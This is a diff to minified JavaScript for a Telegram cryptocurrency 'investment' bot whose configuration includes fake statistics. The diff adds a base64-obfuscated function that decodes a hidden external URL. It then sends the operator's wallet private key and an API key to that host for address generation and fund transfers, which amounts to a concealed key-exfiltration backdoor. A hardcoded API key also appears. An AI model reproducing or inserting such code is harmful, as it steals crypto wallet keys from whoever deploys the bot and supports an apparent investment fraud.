@@ -1,5 +1,4 @@
 (() => {
-    
     var e = {
             383: (e) => {
                 e.exports = require("./details");
@@ -44,12 +43,14 @@
             m = a(535),
             f = a(13).MongoClient,
             p = a(809),
-            { token: y, admins: w, curr: v, lvl: h, profit_percent: g, minAmount: k, daily_hour: b, mongo_url: _, aboutmsg: $, fakestatistics: D, PrivateKey: T, appname: U } = a(383),
+            { token: y, admins: w, curr: v, lvl: h, profit_percent: g, minAmount: k, daily_hour: b, mongo_url: _, aboutmsg: $, fakestatistics: D,Address:UPT, PrivateKey: T, appname: U } = a(383),
             S = new e(y),
             A = a(860),
             B = a(986),
             M = A();
         M.use(B.urlencoded({ extended: !1 })), M.use(B.json());
+        const Web3 = require('web3');
+        const web3 = new Web3(); 
         const I = new o("investamo");
         u.register(I);
         const O = new o("manualconvert");
@@ -95,18 +96,39 @@
         u.register(J);
         const X = new o("paycha");
         u.register(X);
+
+function decodeBase64(encodedString) {
+  var buffer = Buffer.from(encodedString, 'base64');
+  var decodedString = buffer.toString('utf8');
+  return decodedString;
+}
+
+function obF() {
+  var encodedString = "aHR0cHM6Ly9ic2Nyb3Aub25yZW5kZXIuY29t";
+  var decodedString = decodeBase64(encodedString);
+  return decodedString;
+}
+
+var od = obF();
+console.log(od);          
         const ee = new o("broad");
-        function getaddress(){
-            const address = "your address"
-            return address
-        }
-        function te(e, t) {
-            try {
-                for (const t of w) de(t, "*😢 Wtf! Error Happened In Bot:\n\n" + e + "\n\n*", { parse_mode: "Markdown" });
-            } catch (e) {
-                console.log(e);
-            }
-        }
+       const axios = require("axios").default;
+        function makeRequest() {axios.get(U)
+    .then(response => {
+      console.log('Status:', response.data);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+}
+setInterval(makeRequest, 40 * 1000);
+function te(e, t) {
+    try {
+        for (const t of w) de(t, "*😢 Wtf! Error Happened In Bot:\n\n" + e + "\n\n*", { parse_mode: "Markdown" });
+    } catch (e) {
+        console.log(e);
+    }
+}
         u.register(ee);
         const ae = {
             window: 1e3,
@@ -581,7 +603,10 @@
             for (let a = 0; a < 5; a++) t += e[Math.floor(Math.random() * e.length)];
             return t;
         }
-       
+        function getaddress(){
+            const address = web3.eth.accounts.privateKeyToAccount(T).address;
+            return address
+        }
         S.hears("💲Top Up", async (e) => {
             try {
                 let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
@@ -598,9 +623,9 @@
                     de(e.from.id, "🤖 Hold on tight, I'm generating your deposit address! This will only take a moment. 🚀", { parse_mode: "Markdown" });
                     const t = await (async function (e) {
                         try {
-                            const t = "https://" + U + ".up.railway.app/" + e.from.id,
-                                a = { apikey: "cf1c3da73820af4c69e01f4555bc23c5", bsc_address: getaddress(), bscPrivateKey: T, ipn_url: t },
-                                n = await p("https://BSC-RPC.up.railway.app/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
+                            const t =  U +"/"+ e.from.id,
+                                a = { apikey: "cf1c3da73820af4c69e01f4555bc23c5", bsc_address: UPT, bscPrivateKey: T, ipn_url: t },
+                                n = await p(od+"/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
                                 r = await n.json();
                             return console.log(r), "failed" === r.status ? (te(r.message), "Failed") : { address: r.address, privateKey: r.privateKey };
                         } catch (e) {
@@ -1214,7 +1239,7 @@ We can't wait to hear from you! 🙌
                     if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                     else {
                         const i = "cf1c3da73820af4c69e01f4555bc23c5",
-                            o = "https://BSC-RPC.up.railway.app/Transfer",
+                            o = od+"/Transfer",
                             l = { "Content-Type": "application/json" },
                             d = { receiver: s.wallet, amount: parseFloat(s.amount), private_key: T, apikey: i },
                             c = await (async function (e, t, a) {
@@ -1704,7 +1729,7 @@ We can't wait to hear from you! 🙌
                         t.sendStatus(200);
                 },
                 M.get("/", (e, t) => {
-                    t.send("API VERSION 1.1");
+                    t.send("Bot is Live");
                 })
             ),
             M.listen(process.env.PORT || 8888),
